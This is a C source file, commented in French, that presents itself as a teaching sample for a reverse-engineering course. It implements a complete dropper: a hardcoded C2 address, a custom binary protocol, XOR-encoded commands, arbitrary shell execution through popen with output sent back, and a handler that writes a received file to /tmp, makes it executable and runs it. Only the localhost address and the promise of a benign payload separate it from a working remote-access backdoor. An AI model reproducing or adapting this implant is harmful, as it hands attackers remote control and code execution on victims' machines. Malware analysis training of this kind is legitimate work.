/*
 * dropper_sample.c — Sample pédagogique pour la formation Reverse Engineering
 *
 * ⚠️  CE PROGRAMME EST STRICTEMENT ÉDUCATIF.
 *     Il ne doit JAMAIS être exécuté en dehors d'une VM sandboxée isolée.
 *     Il ne contient aucune charge utile réelle.
 *     Le "payload" déposé est un simple script shell inoffensif.
 *
 * Comportement :
 *   1. Connexion TCP vers C2_HOST:C2_PORT (127.0.0.1:4444 par défaut)
 *   2. Envoi d'un handshake (hostname, PID, version)
 *   3. Boucle de réception de commandes du C2
 *   4. Exécution des commandes et renvoi des résultats
 *
 * Protocole binaire custom :
 *   ┌───────────┬──────────┬─────────────┬──────────────────┐
 *   │ magic (1) │ type (1) │ length (2)  │ body (variable)  │
 *   │   0xDE    │  cmd_id  │ little-end. │                  │
 *   └───────────┴──────────┴─────────────┴──────────────────┘
 *
 * Licence MIT — Voir LICENSE à la racine du dépôt.
 */

#define _POSIX_C_SOURCE 200809L
#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <time.h>

/* ═══════════════════════════════════════════════════════════
 *  Configuration C2 — hardcodée (typique d'un vrai dropper)
 * ═══════════════════════════════════════════════════════════ */

#define C2_HOST         "127.0.0.1"
#define C2_PORT         4444
#define BEACON_INTERVAL 5          /* secondes entre chaque beacon */
#define MAX_RETRIES     3          /* tentatives de reconnexion    */
#define DROPPER_VERSION "DRP-1.0"
#define DROP_DIR        "/tmp/"

/* ═══════════════════════════════════════
 *  Constantes du protocole
 * ═══════════════════════════════════════ */

#define PROTO_MAGIC     0xDE
#define PROTO_HDR_SIZE  4          /* magic(1) + type(1) + length(2) */
#define MAX_BODY_SIZE   4096

/* --- Types de messages : Serveur → Client (commandes) --- */
#define CMD_PING        0x01       /* Keepalive                      */
#define CMD_EXEC        0x02       /* Exécuter une commande shell    */
#define CMD_DROP        0x03       /* Déposer un fichier + exécuter  */
#define CMD_SLEEP       0x04       /* Modifier l'intervalle de sleep */
#define CMD_EXIT        0x05       /* Terminer le dropper            */

/* --- Types de messages : Client → Serveur (réponses) --- */
#define MSG_HANDSHAKE   0x10       /* Identification initiale        */
#define MSG_PONG        0x11       /* Réponse au PING                */
#define MSG_RESULT      0x12       /* Résultat d'une commande        */
#define MSG_ACK         0x13       /* Acquittement générique         */
#define MSG_ERROR       0x14       /* Erreur                         */
#define MSG_BEACON      0x15       /* Beacon périodique (heartbeat)  */

/* ═══════════════════════════════════════
 *  Structures
 * ═══════════════════════════════════════ */

/* En-tête du protocole (packed pour correspondre au format fil) */
typedef struct __attribute__((packed)) {
    uint8_t  magic;
    uint8_t  type;
    uint16_t length;     /* taille du body, little-endian */
} proto_header_t;

/* Message complet */
typedef struct {
    proto_header_t header;
    uint8_t        body[MAX_BODY_SIZE];
} proto_message_t;

/* État interne du dropper */
typedef struct {
    int      sockfd;
    int      beacon_interval;
    char     hostname[256];
    pid_t    pid;
    int      running;
    uint32_t cmd_count;      /* compteur de commandes traitées */
} dropper_state_t;

/* ═══════════════════════════════════════
 *  Fonctions réseau de bas niveau
 * ═══════════════════════════════════════ */

/*
 * Établit une connexion TCP vers le C2.
 * Retourne le descripteur de socket, ou -1 en cas d'échec.
 */
static int connect_to_c2(const char *host, int port)
{
    int sockfd;
    struct sockaddr_in server_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[!] socket");
        return -1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons(port);

    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("[!] inet_pton");
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr,
                sizeof(server_addr)) < 0) {
        perror("[!] connect");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

/*
 * Envoie exactement `len` octets sur la socket.
 * Gère les envois partiels.
 */
static int send_all(int sockfd, const void *buf, size_t len)
{
    const uint8_t *ptr = (const uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t sent = send(sockfd, ptr, remaining, 0);
        if (sent <= 0) {
            perror("[!] send");
            return -1;
        }
        ptr       += sent;
        remaining -= sent;
    }
    return 0;
}

/*
 * Reçoit exactement `len` octets depuis la socket.
 * Gère les réceptions partielles.
 */
static int recv_all(int sockfd, void *buf, size_t len)
{
    uint8_t *ptr = (uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t received = recv(sockfd, ptr, remaining, 0);
        if (received <= 0) {
            if (received == 0)
                fprintf(stderr, "[!] Connection closed by C2\n");
            else
                perror("[!] recv");
            return -1;
        }
        ptr       += received;
        remaining -= received;
    }
    return 0;
}

/* ═══════════════════════════════════════
 *  Fonctions du protocole
 * ═══════════════════════════════════════ */

/*
 * Construit et envoie un message protocolaire.
 *
 * Le header et le body sont assemblés dans un buffer unique
 * avant l'envoi, ce qui garantit un seul appel à send_all()
 * (et donc un seul syscall send() dans le cas courant).
 * Cela simplifie la capture réseau et l'instrumentation (Frida/strace).
 */
static int send_message(int sockfd, uint8_t type,
                        const void *body, uint16_t body_len)
{
    uint8_t buf[PROTO_HDR_SIZE + MAX_BODY_SIZE];
    proto_header_t *hdr = (proto_header_t *)buf;

    hdr->magic  = PROTO_MAGIC;
    hdr->type   = type;
    hdr->length = body_len;    /* déjà en little-endian sur x86-64 */

    if (body_len > 0 && body != NULL) {
        memcpy(buf + PROTO_HDR_SIZE, body, body_len);
    }

    return send_all(sockfd, buf, PROTO_HDR_SIZE + body_len);
}

/*
 * Reçoit un message protocolaire complet.
 * Retourne 0 en cas de succès, -1 en cas d'erreur.
 */
static int recv_message(int sockfd, proto_message_t *msg)
{
    /* Réception de l'en-tête */
    if (recv_all(sockfd, &msg->header, PROTO_HDR_SIZE) < 0)
        return -1;

    /* Vérification du magic byte */
    if (msg->header.magic != PROTO_MAGIC) {
        fprintf(stderr, "[!] Invalid magic: 0x%02X (expected 0x%02X)\n",
                msg->header.magic, PROTO_MAGIC);
        return -1;
    }

    /* Vérification de la taille */
    uint16_t body_len = msg->header.length;
    if (body_len > MAX_BODY_SIZE) {
        fprintf(stderr, "[!] Body too large: %u bytes\n", body_len);
        return -1;
    }

    /* Réception du body */
    if (body_len > 0) {
        if (recv_all(sockfd, msg->body, body_len) < 0)
            return -1;
    }

    return 0;
}

/* ═══════════════════════════════════════
 *  Phase de handshake
 * ═══════════════════════════════════════ */

/*
 * Construit le payload du handshake :
 *   [hostname\0][pid_str\0][version\0]
 *
 * Trois chaînes null-terminated concaténées dans le body.
 */
static int perform_handshake(dropper_state_t *state)
{
    uint8_t body[512];
    size_t  offset = 0;
    char    pid_str[16];

    snprintf(pid_str, sizeof(pid_str), "%d", state->pid);

    /* Hostname */
    size_t hn_len = strlen(state->hostname) + 1;
    memcpy(body + offset, state->hostname, hn_len);
    offset += hn_len;

    /* PID */
    size_t pid_len = strlen(pid_str) + 1;
    memcpy(body + offset, pid_str, pid_len);
    offset += pid_len;

    /* Version */
    size_t ver_len = strlen(DROPPER_VERSION) + 1;
    memcpy(body + offset, DROPPER_VERSION, ver_len);
    offset += ver_len;

    printf("[*] Sending handshake: host=%s pid=%s ver=%s\n",
           state->hostname, pid_str, DROPPER_VERSION);

    if (send_message(state->sockfd, MSG_HANDSHAKE,
                     body, (uint16_t)offset) < 0)
        return -1;

    /* Attente de l'ACK du serveur */
    proto_message_t response;
    if (recv_message(state->sockfd, &response) < 0)
        return -1;

    if (response.header.type != MSG_ACK) {
        fprintf(stderr, "[!] Handshake rejected (type=0x%02X)\n",
                response.header.type);
        return -1;
    }

    printf("[+] Handshake accepted by C2\n");
    return 0;
}

/* ═══════════════════════════════════════
 *  Encodage XOR simple (obfuscation)
 * ═══════════════════════════════════════ */

/*
 * Applique un XOR mono-octet sur un buffer.
 * Utilisé pour "encoder" les commandes et les résultats.
 * Clé hardcodée : 0x5A
 *
 * 💡 En RE, repérer ce pattern est un exercice classique :
 *    une boucle XOR avec une constante fixe.
 */
#define XOR_KEY 0x5A

static void xor_encode(uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
}

/* ═══════════════════════════════════════
 *  Handlers de commandes
 * ═══════════════════════════════════════ */

/*
 * CMD_PING (0x01) — Répond avec MSG_PONG.
 */
static int handle_ping(dropper_state_t *state)
{
    printf("[*] PING received, sending PONG\n");
    return send_message(state->sockfd, MSG_PONG, NULL, 0);
}

/*
 * CMD_EXEC (0x02) — Exécute une commande shell et renvoie la sortie.
 *
 * Le body contient la commande encodée en XOR.
 * Le résultat est renvoyé encodé en XOR.
 *
 * ⚠️ Pédagogique : dans un vrai malware, popen() est un indicateur
 *    fort d'exécution de commandes arbitraires.
 */
static int handle_exec(dropper_state_t *state,
                       const uint8_t *body, uint16_t body_len)
{
    if (body_len == 0 || body_len >= MAX_BODY_SIZE) {
        return send_message(state->sockfd, MSG_ERROR, "bad_len", 7);
    }

    /* Décodage XOR de la commande */
    char cmd[MAX_BODY_SIZE];
    memcpy(cmd, body, body_len);
    xor_encode((uint8_t *)cmd, body_len);
    cmd[body_len] = '\0';

    printf("[*] EXEC command: \"%s\"\n", cmd);

    /* Exécution via popen */
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        const char *err = "exec_failed";
        return send_message(state->sockfd, MSG_ERROR,
                            err, (uint16_t)strlen(err));
    }

    uint8_t output[MAX_BODY_SIZE];
    size_t total = 0;

    while (total < MAX_BODY_SIZE - 1) {
        size_t n = fread(output + total, 1,
                         MAX_BODY_SIZE - 1 - total, fp);
        if (n == 0) break;
        total += n;
    }
    pclose(fp);

    /* Encodage XOR du résultat avant envoi */
    xor_encode(output, total);

    printf("[*] Sending result (%zu bytes, XOR-encoded)\n", total);
    return send_message(state->sockfd, MSG_RESULT,
                        output, (uint16_t)total);
}

/*
 * CMD_DROP (0x03) — Dépose un fichier sur disque et l'exécute.
 *
 * Format du body (après décodage XOR) :
 *   [filename_len (1 byte)][filename][payload_data]
 *
 * Le fichier est écrit dans DROP_DIR (/tmp/).
 *
 * ⚠️ Pédagogique : le "payload" déposé est un simple script shell
 *    qui affiche un message. Aucune charge utile réelle.
 */
static int handle_drop(dropper_state_t *state,
                       const uint8_t *body, uint16_t body_len)
{
    if (body_len < 2) {
        return send_message(state->sockfd, MSG_ERROR, "too_short", 9);
    }

    /* Copie et décodage XOR */
    uint8_t decoded[MAX_BODY_SIZE];
    memcpy(decoded, body, body_len);
    xor_encode(decoded, body_len);

    /* Extraction du nom de fichier */
    uint8_t fname_len = decoded[0];
    if (fname_len == 0 || fname_len + 1 >= body_len) {
        return send_message(state->sockfd, MSG_ERROR, "bad_fname", 9);
    }

    char filename[256];
    memcpy(filename, decoded + 1, fname_len);
    filename[fname_len] = '\0';

    /* Construction du chemin complet */
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "%s%s", DROP_DIR, filename);

    /* Extraction du payload */
    const uint8_t *payload_data = decoded + 1 + fname_len;
    uint16_t payload_len = body_len - 1 - fname_len;

    printf("[*] DROP: writing %u bytes to %s\n", payload_len, filepath);

    /* Écriture du fichier */
    FILE *fp = fopen(filepath, "wb");
    if (fp == NULL) {
        perror("[!] fopen (drop)");
        return send_message(state->sockfd, MSG_ERROR, "write_fail", 10);
    }
    fwrite(payload_data, 1, payload_len, fp);
    fclose(fp);

    /* Rendre exécutable */
    chmod(filepath, 0755);

    /* Exécution du payload déposé */
    printf("[*] Executing dropped file: %s\n", filepath);
    int ret = system(filepath);
    printf("[*] Drop execution returned: %d\n", ret);

    /* Envoi de l'ACK avec le code de retour */
    char ack_body[32];
    int ack_len = snprintf(ack_body, sizeof(ack_body), "drop_ok:%d", ret);
    return send_message(state->sockfd, MSG_ACK,
                        ack_body, (uint16_t)ack_len);
}

/*
 * CMD_SLEEP (0x04) — Modifie l'intervalle de beacon.
 *
 * Le body contient le nouvel intervalle en secondes,
 * encodé en little-endian sur 4 octets (non XOR).
 */
static int handle_sleep(dropper_state_t *state,
                        const uint8_t *body, uint16_t body_len)
{
    if (body_len < 4) {
        return send_message(state->sockfd, MSG_ERROR, "bad_sleep", 9);
    }

    uint32_t new_interval;
    memcpy(&new_interval, body, sizeof(uint32_t));

    /* Borne de sécurité (1–3600 secondes) */
    if (new_interval < 1)    new_interval = 1;
    if (new_interval > 3600) new_interval = 3600;

    printf("[*] SLEEP interval changed: %d -> %u seconds\n",
           state->beacon_interval, new_interval);
    state->beacon_interval = (int)new_interval;

    return send_message(state->sockfd, MSG_ACK, "sleep_ok", 8);
}

/*
 * CMD_EXIT (0x05) — Termine proprement le dropper.
 */
static int handle_exit(dropper_state_t *state)
{
    printf("[*] EXIT command received, shutting down\n");
    send_message(state->sockfd, MSG_ACK, "bye", 3);
    state->running = 0;
    return 0;
}

/* ═══════════════════════════════════════
 *  Dispatcher de commandes
 * ═══════════════════════════════════════ */

/*
 * Dispatch une commande reçue vers le handler approprié.
 * C'est la pièce centrale de la machine à états du dropper.
 */
static int dispatch_command(dropper_state_t *state,
                            const proto_message_t *msg)
{
    state->cmd_count++;

    switch (msg->header.type) {
    case CMD_PING:
        return handle_ping(state);

    case CMD_EXEC:
        return handle_exec(state, msg->body, msg->header.length);

    case CMD_DROP:
        return handle_drop(state, msg->body, msg->header.length);

    case CMD_SLEEP:
        return handle_sleep(state, msg->body, msg->header.length);

    case CMD_EXIT:
        return handle_exit(state);

    default:
        fprintf(stderr, "[!] Unknown command type: 0x%02X\n",
                msg->header.type);
        return send_message(state->sockfd, MSG_ERROR, "unknown_cmd", 11);
    }
}

/* ═══════════════════════════════════════
 *  Boucle de beacon et réception
 * ═══════════════════════════════════════ */

/*
 * Envoie un beacon périodique au C2.
 * Le beacon contient le nombre de commandes traitées.
 */
static int send_beacon(dropper_state_t *state)
{
    uint8_t body[8];
    memcpy(body, &state->cmd_count, sizeof(uint32_t));
    /* Timestamp Unix en secondes (4 octets) */
    uint32_t ts = (uint32_t)time(NULL);
    memcpy(body + 4, &ts, sizeof(uint32_t));

    return send_message(state->sockfd, MSG_BEACON, body, 8);
}

/*
 * Boucle principale : attend les commandes du C2.
 *
 * Utilise select() avec un timeout pour alterner entre
 * l'attente de commandes et l'envoi de beacons.
 */
static void command_loop(dropper_state_t *state)
{
    proto_message_t msg;
    fd_set readfds;
    struct timeval tv;

    printf("[*] Entering command loop (interval=%ds)\n",
           state->beacon_interval);

    while (state->running) {
        FD_ZERO(&readfds);
        FD_SET(state->sockfd, &readfds);

        tv.tv_sec  = state->beacon_interval;
        tv.tv_usec = 0;

        int ready = select(state->sockfd + 1, &readfds, NULL, NULL, &tv);

        if (ready < 0) {
            perror("[!] select");
            break;
        }

        if (ready == 0) {
            /* Timeout — envoi d'un beacon */
            printf("[*] Sending beacon...\n");
            if (send_beacon(state) < 0)
                break;
            continue;
        }

        /* Données disponibles : réception d'une commande */
        memset(&msg, 0, sizeof(msg));
        if (recv_message(state->sockfd, &msg) < 0)
            break;

        if (dispatch_command(state, &msg) < 0) {
            fprintf(stderr, "[!] Command handler failed\n");
            break;
        }
    }
}

/* ═══════════════════════════════════════
 *  Collecte d'informations sur la machine
 * ═══════════════════════════════════════ */

/*
 * Récupère le hostname de la machine.
 * Fallback sur "unknown" en cas d'échec.
 */
static void gather_host_info(dropper_state_t *state)
{
    if (gethostname(state->hostname, sizeof(state->hostname)) != 0) {
        strncpy(state->hostname, "unknown", sizeof(state->hostname) - 1);
    }
    state->hostname[sizeof(state->hostname) - 1] = '\0';
    state->pid = getpid();

    printf("[*] Host info: hostname=%s, pid=%d\n",
           state->hostname, state->pid);
}

/* ═══════════════════════════════════════
 *  Point d'entrée
 * ═══════════════════════════════════════ */

int main(void)
{
    dropper_state_t state;
    memset(&state, 0, sizeof(state));
    state.beacon_interval = BEACON_INTERVAL;
    state.running = 1;

    printf("=== Dropper Sample (educational) ===\n");
    printf("[*] Target C2: %s:%d\n", C2_HOST, C2_PORT);

    /* Collecte d'informations */
    gather_host_info(&state);

    /* Boucle de connexion avec tentatives de reconnexion */
    int retries = 0;

    while (state.running && retries < MAX_RETRIES) {
        printf("[*] Connecting to C2 (attempt %d/%d)...\n",
               retries + 1, MAX_RETRIES);

        state.sockfd = connect_to_c2(C2_HOST, C2_PORT);
        if (state.sockfd < 0) {
            retries++;
            if (retries < MAX_RETRIES) {
                printf("[*] Retrying in %d seconds...\n",
                       BEACON_INTERVAL);
                sleep(BEACON_INTERVAL);
            }
            continue;
        }

        printf("[+] Connected to C2\n");
        retries = 0;    /* reset sur connexion réussie */

        /* Handshake */
        if (perform_handshake(&state) < 0) {
            fprintf(stderr, "[!] Handshake failed\n");
            close(state.sockfd);
            retries++;
            continue;
        }

        /* Boucle de commandes */
        command_loop(&state);

        /* Déconnexion */
        close(state.sockfd);
        printf("[*] Disconnected from C2\n");

        if (state.running) {
            /* Reconnexion si on n'a pas reçu CMD_EXIT */
            retries++;
            if (retries < MAX_RETRIES) {
                printf("[*] Will reconnect in %d seconds...\n",
                       BEACON_INTERVAL);
                sleep(BEACON_INTERVAL);
            }
        }
    }

    if (retries >= MAX_RETRIES) {
        printf("[!] Max retries reached, exiting\n");
    }

    printf("[*] Dropper terminated\n");
    return 0;
}
